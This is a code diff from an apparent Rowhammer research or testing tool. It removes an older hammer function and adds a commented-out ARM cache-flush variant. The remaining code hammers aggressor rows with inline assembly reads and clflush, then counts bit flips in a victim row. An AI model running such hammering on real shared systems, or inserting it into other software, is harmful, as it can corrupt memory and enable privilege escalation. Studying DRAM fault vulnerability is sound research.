@@ -130,45 +130,6 @@ void verify_same_bank(uint64_t samples, uint64_t bank_no) {
 
 }
 
-uint32_t hammer_addresses_old(uint64_t vict_virt_addr, uint64_t attacker_virt_addr_1, uint64_t attacker_virt_addr_2) {
-
-    uint8_t *vict_virt_addr_ptr = reinterpret_cast<uint8_t *>(vict_virt_addr);
-    uint8_t *attacker_virt_addr_1_ptr = reinterpret_cast<uint8_t *>(attacker_virt_addr_1);
-    uint8_t *attacker_virt_addr_2_ptr = reinterpret_cast<uint8_t *>(attacker_virt_addr_2);
-    memset(vict_virt_addr_ptr, 0x55, ROW_SIZE);
-    memset(attacker_virt_addr_1_ptr, 0xAA, ROW_SIZE);
-    memset(attacker_virt_addr_2_ptr, 0xAA, ROW_SIZE);
-    
-    clflush_row(vict_virt_addr_ptr);
-    clflush_row(attacker_virt_addr_1_ptr);
-    clflush_row(attacker_virt_addr_2_ptr);
-  
-    int num_reads = HAMMERS_PER_ITER;
-
-    while (num_reads-- > 0 ) {
-        asm volatile(
-            "mov (%0), %%rax\n\t"
-            "mov (%1), %%rax\n\t"
-            "clflush (%0)\n\t"
-            "clflush (%1)\n\t"
-            "mfence\n\t"
-            :
-            : "r" (attacker_virt_addr_1), "r" (attacker_virt_addr_2)
-            : "rax"
-        );
-    }
-
-    clflush_row(vict_virt_addr_ptr);
-
-    uint32_t number_of_bitflips_in_target = 0;
-    for (uint32_t index = 0; index < ROW_SIZE; index++) {
-        if (vict_virt_addr_ptr[index] != 0x55) {
-            number_of_bitflips_in_target++;
-        }
-    }
-    return number_of_bitflips_in_target; 
-}
-
 uint32_t hammer_addresses(uint64_t vict_virt_addr, uint64_t attacker_virt_addr_1, uint64_t attacker_virt_addr_2) {
 
     uint8_t *vict_virt_addr_ptr = reinterpret_cast<uint8_t *>(vict_virt_addr);
@@ -195,6 +156,17 @@ uint32_t hammer_addresses(uint64_t vict_virt_addr, uint64_t attacker_virt_addr_1
             : "r" (attacker_virt_addr_1), "r" (attacker_virt_addr_2)
             : "rax"
         );
+
+        /*
+        asm volatile(
+            "str %2, [%0]\n\t"
+            "str %2, [%1]\n\t"
+            "DC CVAC, %0\n\t"
+            "DC CVAC, %1\n\t"
+            "DSB SY"
+            ::"r" (addr1), "r" (addr2), "r" (temp)
+          );
+        */
     }
 
     clflush_row(vict_virt_addr_ptr);
